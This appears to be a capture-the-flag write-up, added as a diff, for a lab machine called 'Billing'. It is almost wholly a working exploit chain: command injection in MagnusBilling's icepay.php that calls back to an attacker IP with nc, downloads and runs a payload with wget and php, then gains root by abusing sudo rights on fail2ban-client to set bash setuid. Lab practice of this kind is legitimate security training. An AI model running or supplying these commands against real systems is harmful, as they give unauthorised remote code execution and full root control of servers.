@@ -1,0 +1,82 @@
+# RCE 
+curl 'http://billing.thm/mbilling/lib/icepay/icepay.php?democ=testfile;nc%2010.14.28.97%205544'
+
+```
+$ nc -nlvp 5544 -s 10.14.28.97
+Listening on 10.14.28.97 5544
+Connection received on 10.10.247.13 43366
+```
+
+# Get shell
+http://billing.thm/mbilling/lib/icepay/icepay.php?democ=testfile;wget%20http://10.14.28.97/cmd
+
+```
+$ python3 -m http.server -b 10.14.28.97 80
+Serving HTTP on 10.14.28.97 port 80 (http://10.14.28.97:80/) ...
+10.10.247.13 - - [12/Apr/2025 20:33:44] "GET /cmd.txt HTTP/1.1" 200 -
+```
+
+# Trigger RCE
+http://billing.thm/mbilling/lib/icepay/icepay.php?democ=testfile;php%20cmd
+```
+$ nc -nlvp 5544 -s 10.14.28.97
+Listening on 10.14.28.97 5544
+Connection received on 10.10.247.13 39462
+Linux Billing 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux
+ 03:35:52 up 25 min,  0 users,  load average: 0.02, 0.01, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
+sh: 0: can't access tty; job control turned off
+```
+
+# Enumerate sudo privileges
+```
+asterisk@Billing:/tmp$ sudo -l
+Matching Defaults entries for asterisk on Billing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for asterisk:
+    Defaults!/usr/bin/fail2ban-client !requiretty
+
+User asterisk may run the following commands on Billing:
+    (ALL) NOPASSWD: /usr/bin/fail2ban-client
+```
+
+# Privilege escalation via fail2ban
+```
+asterisk@Billing:/tmp/PwnKit$ sudo /usr/bin/fail2ban-client status
+Status
+|- Number of jail:      8
+`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
+asterisk@Billing:/tmp/PwnKit$ sudo /usr/bin/fail2ban-client get sshd actions
+The jail sshd has the following actions:
+iptables-multiport
+asterisk@Billing:/tmp/PwnKit$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
+chmod +s /bin/bash
+asterisk@Billing:/tmp/PwnKit$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
+1
+asterisk@Billing:/tmp/PwnKit$ ls -lah /bin/bash
+-rwsr-sr-x 1 root root 1.2M Mar 27  2022 /bin/bash
+```
+
+# Escalate priv via /bin/bash 
+```
+asterisk@Billing:/tmp/PwnKit$ /bin/bash -p
+bash-5.1# cd /root
+bash-5.1# ls -lah
+total 48K
+drwx------  6 root root 4.0K Mar 31  2024 .
+drwxr-xr-x 19 root root 4.0K Mar 27  2024 ..
+lrwxrwxrwx  1 root root    9 Mar 27  2024 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwx------  3 root root 4.0K Mar 27  2024 .cache
+drwx------  3 root root 4.0K Mar 30  2024 .gnupg
+drwxr-xr-x  3 root root 4.0K Mar 27  2024 .local
+lrwxrwxrwx  1 root root    9 Mar 27  2024 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwxr-xr-x  3 root root 4.0K Mar 27  2024 .subversion
+-rw-r--r--  1 root root  180 Mar 27  2024 .wget-hsts
+-rw-r--r--  1 root root    1 Mar 31  2024 filename
+-rw-r--r--  1 root root   17 Mar 27  2024 passwordMysql.log
+-rw-r--r--  1 root root   38 Mar 27  2024 root.txt
+```
